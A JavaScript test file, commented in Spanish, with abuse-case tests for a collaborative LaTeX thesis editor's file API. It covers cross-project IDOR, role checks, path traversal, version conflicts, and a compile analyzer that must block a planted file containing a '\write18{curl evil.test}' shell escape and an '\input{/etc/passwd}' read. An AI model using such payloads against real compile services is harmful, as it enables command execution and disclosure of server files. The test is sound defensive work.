// Casos de abuso sobre los archivos del proyecto: IDOR entre proyectos,
// rol insuficiente, recorrido de rutas, concurrencia y compilación peligrosa.
// Amenazas: T-P03, T-P07, T-C01 (\write18), T-C02 (lectura fuera del proyecto).
import assert from 'node:assert/strict';
import { before, describe, it } from 'node:test';
import { verifiedUser } from './helpers.mjs';

describe('Archivos cifrados del proyecto', () => {
  let owner, editor, viewer, stranger, projectId, otherProjectId, mainId;

  const join = async (member, role) => {
    const inv = await owner.client.post(`/projects/${projectId}/invitations`, { email: member.email, role });
    assert.equal(inv.status, 201);
    const invitation = (await member.client.get('/invitations')).body.find((i) => i.project.id === projectId);
    assert.equal((await member.client.post(`/invitations/${invitation.id}/accept`)).status, 200);
  };

  before(async () => {
    [owner, editor, viewer, stranger] = await Promise.all([
      verifiedUser('duena'), verifiedUser('editora'), verifiedUser('lectora'), verifiedUser('extrano'),
    ]);
    const created = await owner.client.post('/projects', { name: 'Tesis cifrada', template: 'tesis-uta' });
    assert.equal(created.status, 201);
    projectId = created.body.id;
    otherProjectId = (await stranger.client.post('/projects', { name: 'Proyecto del extraño' })).body.id;
    await join(editor, 'editor');
    await join(viewer, 'viewer');
    const files = await owner.client.get(`/projects/${projectId}/files`);
    mainId = files.body.find((f) => f.path === 'main.tex').id;
  });

  it('la plantilla crea los archivos en el servidor y se leen descifrados', async () => {
    const res = await owner.client.get(`/projects/${projectId}/files/contents`);
    assert.equal(res.status, 200);
    const paths = res.body.map((f) => f.path).sort();
    assert.ok(paths.includes('main.tex') && paths.includes('referencias.bib') && paths.includes('capitulos/introduccion.tex'));
    assert.match(res.body.find((f) => f.path === 'main.tex').content, /\\documentclass/);
  });

  it('un ajeno recibe 404 en el árbol, el contenido y la escritura', async () => {
    assert.equal((await stranger.client.get(`/projects/${projectId}/files`)).status, 404);
    assert.equal((await stranger.client.get(`/projects/${projectId}/files/contents`)).status, 404);
    assert.equal((await stranger.client.get(`/projects/${projectId}/files/${mainId}`)).status, 404);
    assert.equal((await stranger.client.put(`/projects/${projectId}/files/${mainId}/content`, { content: 'x', baseVersion: 1 })).status, 404);
  });

  it('IDOR: un archivo no se alcanza a través de otro proyecto propio', async () => {
    assert.equal((await stranger.client.get(`/projects/${otherProjectId}/files/${mainId}`)).status, 404);
    assert.equal((await stranger.client.del(`/projects/${otherProjectId}/files/${mainId}`)).status, 404);
  });

  it('un lector puede leer pero no escribir, crear ni borrar (403)', async () => {
    assert.equal((await viewer.client.get(`/projects/${projectId}/files/${mainId}`)).status, 200);
    const write = await viewer.client.put(`/projects/${projectId}/files/${mainId}/content`, { content: 'x', baseVersion: 1 });
    assert.equal(write.status, 403);
    assert.equal(write.body.code, 'insufficient_role');
    assert.equal((await viewer.client.post(`/projects/${projectId}/files`, { path: 'nuevo.tex', content: '' })).status, 403);
  });

  it('rutas peligrosas se rechazan con 400', async () => {
    for (const path of ['../fuera.tex', '/etc/passwd.tex', 'a\\b.tex', '.oculto.tex', 'x.sh', 'a/b/c/d/e.tex']) {
      const res = await editor.client.post(`/projects/${projectId}/files`, { path, content: '' });
      assert.equal(res.status, 400, `debió rechazar ${path}`);
    }
  });

  it('autoguardado con concurrencia optimista: la versión vieja recibe 409', async () => {
    const current = (await editor.client.get(`/projects/${projectId}/files/${mainId}`)).body;
    const ok = await editor.client.put(`/projects/${projectId}/files/${mainId}/content`, { content: `${current.content}\n% editado`, baseVersion: current.version });
    assert.equal(ok.status, 200);
    assert.equal(ok.body.version, current.version + 1);
    const stale = await owner.client.put(`/projects/${projectId}/files/${mainId}/content`, { content: 'pisado', baseVersion: current.version });
    assert.equal(stale.status, 409);
    assert.equal(stale.body.code, 'version_conflict');
  });

  it('crear, renombrar y borrar; el principal no se borra', async () => {
    const created = await editor.client.post(`/projects/${projectId}/files`, { path: 'anexos/a.tex', content: 'Anexo' });
    assert.equal(created.status, 201);
    assert.equal((await editor.client.post(`/projects/${projectId}/files`, { path: 'anexos/a.tex', content: '' })).status, 409);
    const renamed = await editor.client.patch(`/projects/${projectId}/files/${created.body.id}`, { path: 'anexos/b.tex' });
    assert.equal(renamed.status, 200);
    assert.equal(renamed.body.path, 'anexos/b.tex');
    assert.equal((await editor.client.del(`/projects/${projectId}/files/${created.body.id}`)).status, 200);
    const main = await editor.client.del(`/projects/${projectId}/files/${mainId}`);
    assert.equal(main.status, 409);
    assert.equal(main.body.code, 'main_file');
  });

  it('el documento principal debe existir en el proyecto', async () => {
    const res = await owner.client.patch(`/projects/${projectId}`, { mainFile: 'no-existe.tex' });
    assert.equal(res.status, 400);
  });

  it('el análisis del servidor bloquea \\write18 y lecturas fuera del proyecto', async () => {
    const clean = await editor.client.post(`/projects/${projectId}/compile/analyze`);
    assert.equal(clean.status, 200);
    assert.notEqual(clean.body.verdict, 'blocked');
    const evil = await editor.client.post(`/projects/${projectId}/files`, { path: 'malo.tex', content: '\\immediate\\write18{curl evil.test}\n\\input{/etc/passwd}' });
    assert.equal(evil.status, 201);
    const blocked = await editor.client.post(`/projects/${projectId}/compile/analyze`);
    assert.equal(blocked.body.verdict, 'blocked');
    assert.deepEqual(blocked.body.findings.map((f) => f.rule).sort(), ['read-outside', 'shell-escape']);
    assert.equal((await stranger.client.post(`/projects/${projectId}/compile/analyze`)).status, 404);
  });

  it('cuota: un archivo de más de 1 MB se rechaza', async () => {
    const res = await editor.client.post(`/projects/${projectId}/files`, { path: 'grande.tex', content: 'a'.repeat(1_000_001) });
    assert.ok([400, 413].includes(res.status), `estado ${res.status}`);
  });
});

describe('Administración de usuarios', () => {
  it('un usuario normal no lista ni suspende cuentas (403)', async () => {
    const user = await verifiedUser('normal');
    assert.equal((await user.client.get('/admin/users')).status, 403);
    assert.equal((await user.client.post(`/admin/users/${user.id}/suspend`)).status, 403);
  });
});
